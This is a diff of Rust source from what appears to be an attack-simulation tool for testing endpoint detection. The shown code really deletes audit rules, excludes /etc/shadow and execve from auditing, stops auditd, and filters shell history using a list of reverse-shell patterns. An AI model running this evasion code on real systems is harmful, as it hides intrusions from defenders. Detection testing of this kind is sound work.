@@ -1,6 +1,9 @@
+// SPDX-FileCopyrightText: GoCortexIO
+// SPDX-License-Identifier: AGPL-3.0-or-later
+
 use crate::config::TechniqueConfig;
 use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
-use crate::techniques::{ExecuteFuture, CleanupFuture};
+use crate::techniques::{CleanupFuture, ExecuteFuture};
 use async_trait::async_trait;
 use log::{info, warn};
 use std::fs::{self, File};
@@ -46,35 +49,33 @@ impl AttackTechnique for DisableAuditLogs {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             use tokio::process::Command;
-            
+
             let backup_file = config
                 .parameters
                 .get("backup_file")
                 .unwrap_or(&"/tmp/signalbench_audit_backup.json".to_string())
                 .clone();
-            
+
             let disable_service = config
                 .parameters
                 .get("disable_service")
                 .unwrap_or(&"true".to_string())
-                .to_lowercase() == "true";
-            
+                .to_lowercase()
+                == "true";
+
             let modify_config = config
                 .parameters
                 .get("modify_config")
                 .unwrap_or(&"false".to_string())
-                .to_lowercase() == "true";
-            
+                .to_lowercase()
+                == "true";
+
             // Check if running as root
             let is_root = unsafe { libc::geteuid() == 0 };
-            
+
             if dry_run {
                 info!("[DRY RUN] Would check auditd status and manipulate audit system");
                 info!("[DRY RUN] Running as root: {is_root}");
@@ -92,7 +93,7 @@ impl AttackTechnique for DisableAuditLogs {
             let mut manipulation_log = String::new();
             let mut methods_used = Vec::new();
             let mut artifacts = vec![backup_file.clone()];
-            
+
             // Step 1: Check if auditd is running
             manipulation_log.push_str("=== Audit System Status Check ===\n");
             let auditd_running = Command::new("systemctl")
@@ -101,34 +102,42 @@ impl AttackTechnique for DisableAuditLogs {
                 .await
                 .map(|output| output.status.success())
                 .unwrap_or(false);
-            
+
             manipulation_log.push_str(&format!("Auditd service running: {auditd_running}\n"));
             manipulation_log.push_str(&format!("Running as root: {is_root}\n"));
-            
+
             // Check for auditctl
-            let auditctl_exists = Path::new("/sbin/auditctl").exists() || 
-                                  Path::new("/usr/sbin/auditctl").exists();
+            let auditctl_exists =
+                Path::new("/sbin/auditctl").exists() || Path::new("/usr/sbin/auditctl").exists();
             manipulation_log.push_str(&format!("auditctl available: {auditctl_exists}\n\n"));
-            
+
             // Step 2: Backup current audit state
             manipulation_log.push_str("=== Backing Up Original Audit State ===\n");
-            
+
             let mut backup_data = String::new();
             backup_data.push_str("{\n");
-            backup_data.push_str(&format!("  \"timestamp\": \"{}\",\n", chrono::Local::now().to_rfc3339()));
+            backup_data.push_str(&format!(
+                "  \"timestamp\": \"{}\",\n",
+                chrono::Local::now().to_rfc3339()
+            ));
             backup_data.push_str(&format!("  \"auditd_running\": {auditd_running},\n"));
             backup_data.push_str(&format!("  \"is_root\": {is_root},\n"));
             backup_data.push_str("  \"service_was_stopped\": false,\n");
-            
+
             // Backup current audit rules
             if auditctl_exists && is_root {
                 match Command::new("auditctl").arg("-l").output().await {
                     Ok(output) => {
                         let rules = String::from_utf8_lossy(&output.stdout);
-                        backup_data.push_str(&format!("  \"original_rules\": {},\n", 
-                            serde_json::to_string(&rules.to_string()).unwrap_or_else(|_| "\"\"".to_string())));
-                        manipulation_log.push_str(&format!("Backed up {} audit rules\n", 
-                            rules.lines().count()));
+                        backup_data.push_str(&format!(
+                            "  \"original_rules\": {},\n",
+                            serde_json::to_string(&rules.to_string())
+                                .unwrap_or_else(|_| "\"\"".to_string())
+                        ));
+                        manipulation_log.push_str(&format!(
+                            "Backed up {} audit rules\n",
+                            rules.lines().count()
+                        ));
                     }
                     Err(e) => {
                         manipulation_log.push_str(&format!("Failed to backup rules: {e}\n"));
@@ -138,188 +147,263 @@ impl AttackTechnique for DisableAuditLogs {
             } else {
                 backup_data.push_str("  \"original_rules\": \"\",\n");
             }
-            
+
             // Backup audit configuration file if it exists
             let audit_conf_path = "/etc/audit/audit.rules";
             if Path::new(audit_conf_path).exists() && is_root {
                 match fs::read_to_string(audit_conf_path) {
                     Ok(content) => {
-                        backup_data.push_str(&format!("  \"audit_rules_file_content\": {},\n",
-                            serde_json::to_string(&content).unwrap_or_else(|_| "\"\"".to_string())));
+                        backup_data.push_str(&format!(
+                            "  \"audit_rules_file_content\": {},\n",
+                            serde_json::to_string(&content).unwrap_or_else(|_| "\"\"".to_string())
+                        ));
                         manipulation_log.push_str(&format!("Backed up {audit_conf_path}\n"));
                     }
                     Err(e) => {
-                        manipulation_log.push_str(&format!("Could not read {audit_conf_path}: {e}\n"));
+                        manipulation_log
+                            .push_str(&format!("Could not read {audit_conf_path}: {e}\n"));
                         backup_data.push_str("  \"audit_rules_file_content\": \"\",\n");
                     }
                 }
             } else {
                 backup_data.push_str("  \"audit_rules_file_content\": \"\",\n");
             }
-            
+
             manipulation_log.push('\n');
-            
+
             // Step 3: Audit System Manipulation (only if root)
             let mut service_was_stopped = false;
-            
+
             if is_root {
                 manipulation_log.push_str("=== Audit Manipulation (ROOT) ===\n");
                 manipulation_log.push_str(&format!("Configuration: disable_service={disable_service}, modify_config={modify_config}\n\n"));
-                
+
                 // Method 1: Use auditctl to delete ALL rules and add exclusions
                 if auditctl_exists {
                     manipulation_log.push_str("METHOD 1: Enhanced auditctl manipulation\n");
                     manipulation_log.push_str("Executing: auditctl -D (delete ALL rules)...\n");
-                    
+
                     match Command::new("auditctl").arg("-D").output().await {
                         Ok(output) => {
                             if output.status.success() {
                                 methods_used.push("auditctl_delete_rules".to_string());
-                                manipulation_log.push_str("[OK] Successfully deleted all audit rules with auditctl -D\n");
-                                
+                                manipulation_log.push_str(
+                                    "[OK] Successfully deleted all audit rules with auditctl -D\n",
+                                );
+
                                 // Add exclusion rules for directories and files
                                 manipulation_log.push_str("\nAdding exclusion rules...\n");
-                                
+
                                 // Rule 1: Exclude /tmp directory (common staging location)
                                 match Command::new("auditctl")
                                     .args(["-a", "never,exit", "-F", "dir=/tmp"])
                                     .output()
-                                    .await {
+                                    .await
+                                {
                                     Ok(cmd_output) => {
                                         if cmd_output.status.success() {
-                                            manipulation_log.push_str("  [OK] Added exclusion for /tmp directory\n");
+                                            manipulation_log.push_str(
+                                                "  [OK] Added exclusion for /tmp directory\n",
+                                            );
                                         } else {
-                                            manipulation_log.push_str("  ✗ Failed to add /tmp exclusion\n");
+                                            manipulation_log.push_str(
+                                                "  [FAIL] Failed to add /tmp exclusion\n",
+                                            );
                                         }
                                     }
                                     Err(e) => {
-                                        manipulation_log.push_str(&format!("  ✗ Error adding /tmp rule: {e}\n"));
+                                        manipulation_log.push_str(&format!(
+                                            "  [FAIL] Error adding /tmp rule: {e}\n"
+                                        ));
                                     }
                                 }
-                                
+
                                 // Rule 2: Exclude /var directory
                                 match Command::new("auditctl")
                                     .args(["-a", "never,exit", "-F", "dir=/var"])
                                     .output()
-                                    .await {
+                                    .await
+                                {
                                     Ok(cmd_output) => {
                                         if cmd_output.status.success() {
-                                            manipulation_log.push_str("  [OK] Added exclusion for /var directory\n");
+                                            manipulation_log.push_str(
+                                                "  [OK] Added exclusion for /var directory\n",
+                                            );
                                         } else {
-                                            manipulation_log.push_str("  ✗ Failed to add /var exclusion\n");
+                                            manipulation_log.push_str(
+                                                "  [FAIL] Failed to add /var exclusion\n",
+                                            );
                                         }
                                     }
                                     Err(e) => {
-                                        manipulation_log.push_str(&format!("  ✗ Error adding /var rule: {e}\n"));
+                                        manipulation_log.push_str(&format!(
+                                            "  [FAIL] Error adding /var rule: {e}\n"
+                                        ));
                                     }
                                 }
-                                
+
                                 // Rule 3: Exclude /etc/passwd writes
                                 match Command::new("auditctl")
-                                    .args(["-a", "never,exit", "-F", "path=/etc/passwd", "-F", "perm=wa"])
+                                    .args([
+                                        "-a",
+                                        "never,exit",
+                                        "-F",
+                                        "path=/etc/passwd",
+                                        "-F",
+                                        "perm=wa",
+                                    ])
                                     .output()
-                                    .await {
+                                    .await
+                                {
                                     Ok(cmd_output) => {
                                         if cmd_output.status.success() {
-                                            manipulation_log.push_str("  [OK] Added exclusion for /etc/passwd writes\n");
+                                            manipulation_log.push_str(
+                                                "  [OK] Added exclusion for /etc/passwd writes\n",
+                                            );
                                         } else {
-                                            manipulation_log.push_str("  ✗ Failed to add /etc/passwd exclusion\n");
+                                            manipulation_log.push_str(
+                                                "  [FAIL] Failed to add /etc/passwd exclusion\n",
+                                            );
                                         }
                                     }
                                     Err(e) => {
-                                        manipulation_log.push_str(&format!("  ✗ Error adding /etc/passwd rule: {e}\n"));
+                                        manipulation_log.push_str(&format!(
+                                            "  [FAIL] Error adding /etc/passwd rule: {e}\n"
+                                        ));
                                     }
                                 }
-                                
+
                                 // Rule 4: Exclude /etc/shadow writes
                                 match Command::new("auditctl")
-                                    .args(["-a", "never,exit", "-F", "path=/etc/shadow", "-F", "perm=wa"])
+                                    .args([
+                                        "-a",
+                                        "never,exit",
+                                        "-F",
+                                        "path=/etc/shadow",
+                                        "-F",
+                                        "perm=wa",
+                                    ])
                                     .output()
-                                    .await {
+                                    .await
+                                {
                                     Ok(cmd_output) => {
                                         if cmd_output.status.success() {
-                                            manipulation_log.push_str("  [OK] Added exclusion for /etc/shadow writes\n");
+                                            manipulation_log.push_str(
+                                                "  [OK] Added exclusion for /etc/shadow writes\n",
+                                            );
                                         } else {
-                                            manipulation_log.push_str("  ✗ Failed to add /etc/shadow exclusion\n");
+                                            manipulation_log.push_str(
+                                                "  [FAIL] Failed to add /etc/shadow exclusion\n",
+                                            );
                                         }
                                     }
                                     Err(e) => {
-                                        manipulation_log.push_str(&format!("  ✗ Error adding /etc/shadow rule: {e}\n"));
+                                        manipulation_log.push_str(&format!(
+                                            "  [FAIL] Error adding /etc/shadow rule: {e}\n"
+                                        ));
                                     }
                                 }
-                                
+
                                 // Rule 5: Exclude execve syscalls (process execution)
                                 match Command::new("auditctl")
                                     .args(["-a", "never,exit", "-S", "execve"])
                                     .output()
-                                    .await {
+                                    .await
+                                {
                                     Ok(cmd_output) => {
                                         if cmd_output.status.success() {
-                                            manipulation_log.push_str("  [OK] Added exclusion for execve syscalls\n");
+                                            manipulation_log.push_str(
+                                                "  [OK] Added exclusion for execve syscalls\n",
+                                            );
                                         } else {
-                                            manipulation_log.push_str("  ✗ Failed to add execve exclusion\n");
+                                            manipulation_log.push_str(
+                                                "  [FAIL] Failed to add execve exclusion\n",
+                                            );
                                         }
                                     }
                                     Err(e) => {
-                                        manipulation_log.push_str(&format!("  ✗ Error adding execve rule: {e}\n"));
+                                        manipulation_log.push_str(&format!(
+                                            "  [FAIL] Error adding execve rule: {e}\n"
+                                        ));
                                     }
                                 }
-                                
+
                                 // Rule 6: Exclude execveat syscalls
                                 match Command::new("auditctl")
                                     .args(["-a", "never,exit", "-S", "execveat"])
                                     .output()
-                                    .await {
+                                    .await
+                                {
                                     Ok(cmd_output) => {
                                         if cmd_output.status.success() {
-                                            manipulation_log.push_str("  [OK] Added exclusion for execveat syscalls\n");
+                                            manipulation_log.push_str(
+                                                "  [OK] Added exclusion for execveat syscalls\n",
+                                            );
                                         } else {
-                                            manipulation_log.push_str("  ✗ Failed to add execveat exclusion\n");
+                                            manipulation_log.push_str(
+                                                "  [FAIL] Failed to add execveat exclusion\n",
+                                            );
                                         }
                                     }
                                     Err(e) => {
-                                        manipulation_log.push_str(&format!("  ✗ Error adding execveat rule: {e}\n"));
+                                        manipulation_log.push_str(&format!(
+                                            "  [FAIL] Error adding execveat rule: {e}\n"
+                                        ));
                                     }
                                 }
                             } else {
                                 let stderr = String::from_utf8_lossy(&output.stderr);
-                                manipulation_log.push_str(&format!("✗ Failed to delete rules: {stderr}\n"));
+                                manipulation_log.push_str(&format!(
+                                    "[FAIL] Failed to delete rules: {stderr}\n"
+                                ));
                             }
                         }
                         Err(e) => {
-                            manipulation_log.push_str(&format!("✗ Error executing auditctl: {e}\n"));
+                            manipulation_log
+                                .push_str(&format!("[FAIL] Error executing auditctl: {e}\n"));
                         }
                     }
                 }
-                
+
                 // Method 2: Stop auditd service (if enabled)
                 if disable_service && auditd_running {
                     manipulation_log.push_str("\nMETHOD 2: Stopping auditd service\n");
                     manipulation_log.push_str("Executing: systemctl stop auditd...\n");
-                    
-                    match Command::new("systemctl").args(["stop", "auditd"]).output().await {
+
+                    match Command::new("systemctl")
+                        .args(["stop", "auditd"])
+                        .output()
+                        .await
+                    {
                         Ok(output) => {
                             if output.status.success() {
                                 methods_used.push("service_stop".to_string());
                                 service_was_stopped = true;
-                                manipulation_log.push_str("[OK] Successfully stopped auditd service\n");
-                                manipulation_log.push_str("  WARNING: Service state change generates EDR telemetry!\n");
+                                manipulation_log
+                                    .push_str("[OK] Successfully stopped auditd service\n");
+                                manipulation_log.push_str(
+                                    "  WARNING: Service state change generates EDR telemetry!\n",
+                                );
                             } else {
                                 let stderr = String::from_utf8_lossy(&output.stderr);
-                                manipulation_log.push_str(&format!("✗ Failed to stop service: {stderr}\n"));
+                                manipulation_log.push_str(&format!(
+                                    "[FAIL] Failed to stop service: {stderr}\n"
+                                ));
                             }
                         }
                         Err(e) => {
-                            manipulation_log.push_str(&format!("✗ Error stopping service: {e}\n"));
+                            manipulation_log
+                                .push_str(&format!("[FAIL] Error stopping service: {e}\n"));
                         }
                     }
                 }
-                
+
                 // Method 3: Modify audit.rules file (if enabled - direct file modification)
                 if modify_config && Path::new(audit_conf_path).exists() {
-                    manipulation_log.push_str("\nMETHOD 3: Direct modification of /etc/audit/audit.rules\n");
+                    manipulation_log
+                        .push_str("\nMETHOD 3: Direct modification of /etc/audit/audit.rules\n");
                     manipulation_log.push_str(&format!("Modifying {audit_conf_path}...\n"));
-                    
+
                     let disable_rules = r#"
 ## SignalBench T1562.002 - Audit Rules Disabled by GoCortex.io v1.5.13
 ## Original rules backed up to backup file
@@ -352,36 +436,39 @@ impl AttackTechnique for DisableAuditLogs {
 -a never,exit -S open,openat,creat
 -a never,exit -S unlink,unlinkat,rename,renameat
 "#;
-                    
+
                     match File::create(audit_conf_path) {
-                        Ok(mut file) => {
-                            match file.write_all(disable_rules.as_bytes()) {
-                                Ok(_) => {
-                                    methods_used.push("file_modification".to_string());
-                                    manipulation_log.push_str(&format!("[OK] Successfully modified {audit_conf_path}\n"));
-                                    manipulation_log.push_str("  WARNING: File modification generates strong EDR signals!\n");
-                                }
-                                Err(e) => {
-                                    manipulation_log.push_str(&format!("✗ Failed to write to file: {e}\n"));
-                                }
+                        Ok(mut file) => match file.write_all(disable_rules.as_bytes()) {
+                            Ok(_) => {
+                                methods_used.push("file_modification".to_string());
+                                manipulation_log.push_str(&format!(
+                                    "[OK] Successfully modified {audit_conf_path}\n"
+                                ));
+                                manipulation_log.push_str(
+                                    "  WARNING: File modification generates strong EDR signals!\n",
+                                );
                             }
-                        }
+                            Err(e) => {
+                                manipulation_log
+                                    .push_str(&format!("[FAIL] Failed to write to file: {e}\n"));
+                            }
+                        },
                         Err(e) => {
-                            manipulation_log.push_str(&format!("✗ Failed to open file: {e}\n"));
+                            manipulation_log
+                                .push_str(&format!("[FAIL] Failed to open file: {e}\n"));
                         }
                     }
                 }
-                
             } else {
                 manipulation_log.push_str("=== NOT RUNNING AS ROOT ===\n");
                 manipulation_log.push_str("Audit manipulation requires root privileges.\n");
                 manipulation_log.push_str("Only creating simulation telemetry.\n\n");
-                
+
                 methods_used.push("simulation_only".to_string());
-                
+
                 let sim_file = "/tmp/signalbench_audit_simulation.log".to_string();
                 artifacts.push(sim_file.clone());
-                
+
                 let mut sim_log = File::create(&sim_file)
                     .map_err(|e| format!("Failed to create simulation log: {e}"))?;
                 writeln!(sim_log, "=== SignalBench Audit Manipulation Simulation ===")
@@ -393,29 +480,35 @@ impl AttackTechnique for DisableAuditLogs {
                 writeln!(sim_log, "  sudo signalbench --technique T1562.002")
                     .map_err(|e| format!("Failed to write: {e}"))?;
             }
-            
+
             // Complete backup file with comprehensive tracking
-            let methods_json = serde_json::to_string(&methods_used).unwrap_or_else(|_| "[]".to_string());
-            backup_data = backup_data.replace("\"service_was_stopped\": false,", 
-                                              &format!("\"service_was_stopped\": {service_was_stopped},"));
+            let methods_json =
+                serde_json::to_string(&methods_used).unwrap_or_else(|_| "[]".to_string());
+            backup_data = backup_data.replace(
+                "\"service_was_stopped\": false,",
+                &format!("\"service_was_stopped\": {service_was_stopped},"),
+            );
             backup_data.push_str(&format!("  \"methods_used\": {methods_json},\n"));
             backup_data.push_str(&format!("  \"backed_up_files\": [\"{backup_file}\"],\n"));
-            backup_data.push_str(&format!("  \"disable_service_param\": {disable_service},\n"));
+            backup_data.push_str(&format!(
+                "  \"disable_service_param\": {disable_service},\n"
+            ));
             backup_data.push_str(&format!("  \"modify_config_param\": {modify_config}\n"));
             backup_data.push_str("}\n");
-            
+
             let mut backup = File::create(&backup_file)
                 .map_err(|e| format!("Failed to create backup file: {e}"))?;
-            backup.write_all(backup_data.as_bytes())
+            backup
+                .write_all(backup_data.as_bytes())
                 .map_err(|e| format!("Failed to write backup: {e}"))?;
-            
+
             manipulation_log.push_str("\n=== Audit Manipulation Summary ===\n");
             manipulation_log.push_str(&format!("Methods used: {}\n", methods_used.join(", ")));
             manipulation_log.push_str(&format!("Service was stopped: {service_was_stopped}\n"));
             manipulation_log.push_str(&format!("Backup file: {backup_file}\n"));
-            
+
             info!("{manipulation_log}");
-            
+
             let success_msg = if is_root {
                 if methods_used.is_empty() {
                     format!("WARNING: No manipulation methods succeeded. Check logs. Backup saved to {backup_file}")
@@ -426,7 +519,7 @@ impl AttackTechnique for DisableAuditLogs {
             } else {
                 format!("Simulation only (not root). Created telemetry without actual manipulation. Backup: {backup_file}")
             };
-            
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
@@ -440,108 +533,127 @@ impl AttackTechnique for DisableAuditLogs {
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             use tokio::process::Command;
-            
+
             info!("=== Restoring Audit System ===");
-            
+
             // Find the backup file
-            let backup_file = artifacts.iter()
+            let backup_file = artifacts
+                .iter()
                 .find(|f| f.contains("backup.json"))
                 .cloned();
-            
+
             if let Some(backup_path) = backup_file {
                 if Path::new(&backup_path).exists() {
                     // Read backup to determine restoration method
                     match fs::read_to_string(&backup_path) {
                         Ok(backup_content) => {
                             info!("Reading backup from: {backup_path}");
-                            
+
                             // Parse the backup JSON
-                            if let Ok(backup_json) = serde_json::from_str::<serde_json::Value>(&backup_content) {
-                                let methods_used = backup_json.get("methods_used")
+                            if let Ok(backup_json) =
+                                serde_json::from_str::<serde_json::Value>(&backup_content)
+                            {
+                                let methods_used = backup_json
+                                    .get("methods_used")
                                     .and_then(|v| v.as_array())
-                                    .map(|arr| arr.iter()
-                                        .filter_map(|v| v.as_str())
-                                        .map(|s| s.to_string())
-                                        .collect::<Vec<_>>())
+                                    .map(|arr| {
+                                        arr.iter()
+                                            .filter_map(|v| v.as_str())
+                                            .map(|s| s.to_string())
+                                            .collect::<Vec<_>>()
+                                    })
                                     .unwrap_or_default();
-                                
-                                let service_was_stopped = backup_json.get("service_was_stopped")
+
+                                let service_was_stopped = backup_json
+                                    .get("service_was_stopped")
                                     .and_then(|v| v.as_bool())
                                     .unwrap_or(false);
-                                
+
                                 let is_root = unsafe { libc::geteuid() == 0 };
-                                
+
                                 info!("Detected methods used: {}", methods_used.join(", "));
                                 info!("Service was stopped: {service_was_stopped}");
-                                
+
                                 if !is_root {
                                     warn!("Not running as root - cannot restore audit system");
                                     warn!("Run cleanup with sudo to properly restore audit configuration");
                                 } else {
                                     // Restore in reverse order for safety
-                                    
+
                                     // Step 1: Restore file modification if it was done
                                     if methods_used.contains(&"file_modification".to_string()) {
                                         info!("\n=== Restoring /etc/audit/audit.rules ===");
-                                        
-                                        if let Some(original_content) = backup_json.get("audit_rules_file_content")
-                                            .and_then(|v| v.as_str()) {
-                                            
+
+                                        if let Some(original_content) = backup_json
+                                            .get("audit_rules_file_content")
+                                            .and_then(|v| v.as_str())
+                                        {
                                             match File::create("/etc/audit/audit.rules") {
                                                 Ok(mut file) => {
                                                     match file.write_all(original_content.as_bytes()) {
                                                         Ok(_) => {
                                                             info!("[OK] Successfully restored audit.rules file");
                                                         }
-                                                        Err(e) => warn!("✗ Failed to write restored rules: {e}"),
+                                                        Err(e) => warn!("[FAIL] Failed to write restored rules: {e}"),
                                                     }
                                                 }
-                                                Err(e) => warn!("✗ Failed to open audit.rules: {e}"),
+                                                Err(e) => {
+                                                    warn!("[FAIL] Failed to open audit.rules: {e}")
+                                                }
                                             }
                                         }
                                     }
-                                    
+
                                     // Step 2: Restore audit rules if they were deleted
                                     if methods_used.contains(&"auditctl_delete_rules".to_string()) {
                                         info!("\n=== Restoring Audit Rules ===");
-                                        
+
                                         // First, delete all current malicious rules
                                         info!("Clearing current (malicious) audit rules...");
                                         let _ = Command::new("auditctl").arg("-D").output().await;
-                                        
+
                                         // Restore original rules
-                                        if let Some(rules_str) = backup_json.get("original_rules")
-                                            .and_then(|v| v.as_str()) {
-                                            
-                                            let rules: Vec<&str> = rules_str.lines()
-                                                .filter(|line| !line.trim().is_empty() && !line.starts_with("No rules"))
+                                        if let Some(rules_str) = backup_json
+                                            .get("original_rules")
+                                            .and_then(|v| v.as_str())
+                                        {
+                                            let rules: Vec<&str> = rules_str
+                                                .lines()
+                                                .filter(|line| {
+                                                    !line.trim().is_empty()
+                                                        && !line.starts_with("No rules")
+                                                })
                                                 .collect();
-                                            
+
                                             if !rules.is_empty() {
                                                 info!("Restoring {} audit rules...", rules.len());
-                                                
+
                                                 // Write rules to temporary file
-                                                let temp_rules = "/tmp/signalbench_restore_rules.txt";
+                                                let temp_rules =
+                                                    "/tmp/signalbench_restore_rules.txt";
                                                 if let Ok(mut f) = File::create(temp_rules) {
                                                     for rule in &rules {
-                                                        let _ = writeln!(f,"{rule}");
+                                                        let _ = writeln!(f, "{rule}");
                                                     }
-                                                    
+
                                                     // Load rules from file
                                                     match Command::new("auditctl")
                                                         .args(["-R", temp_rules])
                                                         .output()
-                                                        .await {
+                                                        .await
+                                                    {
                                                         Ok(output) => {
                                                             if output.status.success() {
                                                                 info!("[OK] Successfully restored audit rules");
                                                             } else {
-                                                                warn!("✗ Failed to restore some audit rules");
+                                                                warn!("[FAIL] Failed to restore some audit rules");
                                                             }
                                                         }
-                                                        Err(e) => warn!("✗ Error restoring rules: {e}"),
+                                                        Err(e) => warn!(
+                                                            "[FAIL] Error restoring rules: {e}"
+                                                        ),
                                                     }
-                                                    
+
                                                     let _ = fs::remove_file(temp_rules);
                                                 }
                                             } else {
@@ -549,55 +661,63 @@ impl AttackTechnique for DisableAuditLogs {
                                             }
                                         }
                                     }
-                                    
+
                                     // Step 3: Restart auditd service if it was stopped
                                     if service_was_stopped {
                                         info!("\n=== Restarting Auditd Service ===");
                                         info!("Service was stopped during manipulation - restarting...");
-                                        
+
                                         match Command::new("systemctl")
                                             .args(["start", "auditd"])
                                             .output()
-                                            .await {
+                                            .await
+                                        {
                                             Ok(output) => {
                                                 if output.status.success() {
                                                     info!("[OK] Successfully restarted auditd service");
                                                 } else {
-                                                    let stderr = String::from_utf8_lossy(&output.stderr);
-                                                    warn!("✗ Failed to restart auditd service: {stderr}");
+                                                    let stderr =
+                                                        String::from_utf8_lossy(&output.stderr);
+                                                    warn!("[FAIL] Failed to restart auditd service: {stderr}");
                                                 }
                                             }
-                                            Err(e) => warn!("✗ Error restarting service: {e}"),
+                                            Err(e) => warn!("[FAIL] Error restarting service: {e}"),
                                         }
                                     }
-                                    
+
                                     // Handle simulation-only case
                                     if methods_used.contains(&"simulation_only".to_string()) {
                                         info!("Simulation only - no restoration needed");
                                     }
-                                    
+
                                     // Verify audit system is restored
                                     info!("\n=== Verifying Audit System ===");
                                     match Command::new("systemctl")
                                         .args(["is-active", "auditd"])
                                         .output()
-                                        .await {
+                                        .await
+                                    {
                                         Ok(output) => {
                                             if output.status.success() {
                                                 info!("[OK] Auditd service is active");
                                             } else {
-                                                warn!("✗ Auditd service is not active");
+                                                warn!("[FAIL] Auditd service is not active");
                                             }
                                         }
                                         Err(e) => warn!("Could not check auditd status: {e}"),
                                     }
-                                    
-                                    if Path::new("/sbin/auditctl").exists() || Path::new("/usr/sbin/auditctl").exists() {
-                                        if let Ok(output) = Command::new("auditctl").arg("-l").output().await {
-                                            let rules_count = String::from_utf8_lossy(&output.stdout)
-                                                .lines()
-                                                .filter(|line| !line.starts_with("No rules"))
-                                                .count();
+
+                                    if Path::new("/sbin/auditctl").exists()
+                                        || Path::new("/usr/sbin/auditctl").exists()
+                                    {
+                                        if let Ok(output) =
+                                            Command::new("auditctl").arg("-l").output().await
+                                        {
+                                            let rules_count =
+                                                String::from_utf8_lossy(&output.stdout)
+                                                    .lines()
+                                                    .filter(|line| !line.starts_with("No rules"))
+                                                    .count();
                                             info!("Current audit rules: {rules_count}");
                                         }
                                     }
@@ -610,7 +730,7 @@ impl AttackTechnique for DisableAuditLogs {
                     }
                 }
             }
-            
+
             // Clean up artifacts
             for artifact in artifacts {
                 if Path::new(artifact).exists() {
@@ -620,7 +740,7 @@ impl AttackTechnique for DisableAuditLogs {
                     }
                 }
             }
-            
+
             info!("=== Audit System Restoration Complete ===");
             Ok(())
         })
@@ -653,28 +773,24 @@ impl AttackTechnique for ClearBashHistory {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             use std::os::unix::fs::PermissionsExt;
             use uuid::Uuid;
-            
+
             let session_id = Uuid::new_v4().to_string()[..8].to_string();
             let backup_dir = format!("/tmp/signalbench_history_backup_{session_id}");
             let clear_log = format!("/tmp/signalbench_history_clear_{session_id}.log");
             let artifacts_json = format!("/tmp/signalbench_history_artifacts_{session_id}.json");
-            
+
             let clear_method = config
                 .parameters
                 .get("clear_method")
                 .unwrap_or(&"filter".to_string())
                 .clone();
-            
+
             let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
-            
+
             // History files to target
             let history_files = vec![
                 format!("{home}/.bash_history"),
@@ -684,14 +800,16 @@ impl AttackTechnique for ClearBashHistory {
                 format!("{home}/.mysql_history"),
                 format!("{home}/.psql_history"),
             ];
-            
+
             if dry_run {
                 info!("[DRY RUN] Would modify shell history files using method: {clear_method}");
                 info!("[DRY RUN] Target files: {}", history_files.join(", "));
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
-                    message: format!("DRY RUN: Would clear history files using method {clear_method}"),
+                    message: format!(
+                        "DRY RUN: Would clear history files using method {clear_method}"
+                    ),
                     artifacts: vec![backup_dir, clear_log, artifacts_json],
                     cleanup_required: false,
                 });
@@ -702,11 +820,14 @@ impl AttackTechnique for ClearBashHistory {
                 .map_err(|e| format!("Failed to create backup directory: {e}"))?;
             info!("Created backup directory: {backup_dir}");
 
-            let mut log_file = File::create(&clear_log)
-                .map_err(|e| format!("Failed to create log file: {e}"))?;
-            
-            writeln!(log_file, "=== SignalBench T1070.003 Clear Command History ===")
-                .map_err(|e| format!("Failed to write: {e}"))?;
+            let mut log_file =
+                File::create(&clear_log).map_err(|e| format!("Failed to create log file: {e}"))?;
+
+            writeln!(
+                log_file,
+                "=== SignalBench T1070.003 Clear Command History ==="
+            )
+            .map_err(|e| format!("Failed to write: {e}"))?;
             writeln!(log_file, "Session ID: {session_id}")
                 .map_err(|e| format!("Failed to write: {e}"))?;
             writeln!(log_file, "Timestamp: {}", chrono::Local::now().to_rfc3339())
@@ -718,8 +839,16 @@ impl AttackTechnique for ClearBashHistory {
 
             // Suspicious patterns to filter
             let suspicious_patterns = [
-                "ssh", "sudo", "wget", "curl", "nc", "bash -i", 
-                "/dev/tcp", "base64", "python -c", "perl -e",
+                "ssh",
+                "sudo",
+                "wget",
+                "curl",
+                "nc",
+                "bash -i",
+                "/dev/tcp",
+                "base64",
+                "python -c",
+                "perl -e",
             ];
 
             let mut artifacts_data = serde_json::json!({
@@ -747,7 +876,7 @@ impl AttackTechnique for ClearBashHistory {
                     .file_name()
                     .and_then(|n| n.to_str())
                     .unwrap_or("unknown");
-                
+
                 writeln!(log_file, "Processing: {history_path}")
                     .map_err(|e| format!("Failed to write: {e}"))?;
 
@@ -766,7 +895,7 @@ impl AttackTechnique for ClearBashHistory {
                 let backup_path = format!("{backup_dir}/{file_name}");
                 fs::copy(history_path, &backup_path)
                     .map_err(|e| format!("Failed to backup {history_path}: {e}"))?;
-                
+
                 writeln!(log_file, "  [OK] Backed up to: {backup_path}")
                     .map_err(|e| format!("Failed to write: {e}"))?;
                 writeln!(log_file, "  Original entries: {original_count}")
@@ -775,41 +904,52 @@ impl AttackTechnique for ClearBashHistory {
                     .map_err(|e| format!("Failed to write: {e}"))?;
 
                 // Modify the history file
-                let (modified_content, entries_removed, removed_samples) = if clear_method == "truncate" {
-                    // Truncate to empty
-                    writeln!(log_file, "  Method: Truncating to 0 bytes")
-                        .map_err(|e| format!("Failed to write: {e}"))?;
-                    (String::new(), original_count, original_lines.iter().take(10).map(|s| s.to_string()).collect::<Vec<_>>())
-                } else {
-                    // Filter suspicious patterns
-                    writeln!(log_file, "  Method: Filtering suspicious patterns")
-                        .map_err(|e| format!("Failed to write: {e}"))?;
-                    
-                    let mut removed = Vec::new();
-                    let filtered_lines: Vec<&str> = original_lines.iter()
-                        .filter(|line| {
-                            let is_suspicious = suspicious_patterns.iter()
-                                .any(|pattern| line.contains(pattern));
-                            
